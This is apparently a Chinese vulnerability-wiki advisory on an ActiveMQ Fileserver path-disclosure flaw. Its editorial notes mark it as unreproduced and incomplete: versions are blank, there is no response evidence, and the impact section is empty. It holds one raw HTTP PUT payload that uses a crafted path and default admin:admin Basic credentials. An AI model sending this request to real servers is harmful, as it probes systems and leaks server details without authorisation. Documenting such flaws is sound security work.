---
source: "hatch 补库批 20260928"
title: "ActiveMQ物理路径泄漏漏洞"
product: "ActiveMQ旧Fileserver"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Fileserver存在/PUT开启、错误响应泄露，示例带Basic admin凭据"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-3dd320e4d174d2e59bb98000"
entity_id: "ve-3dd320e4d174d2e59bb98000"
schema_version: "1"
---

# ActiveMQ物理路径泄漏漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Fileserver存在/PUT开启、错误响应泄露，示例带Basic admin凭据
- 证据范围：无响应证据且Content-Length4后body缺失，不能从请求确认泄露

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响版本空白，默认PUT泛化所有版本错误
- 示例认证与未授权风险未区分，需说明认证前提
- 可并入3088路径定位辅助，不单独强分CVE

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息

二、漏洞影响
------------

三、复现过程
------------

    Request Raw:
    PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
    Host: 192.168.197.25:8161
    Authorization: Basic YWRtaW46YWRtaW4=
    Content-Length: 4
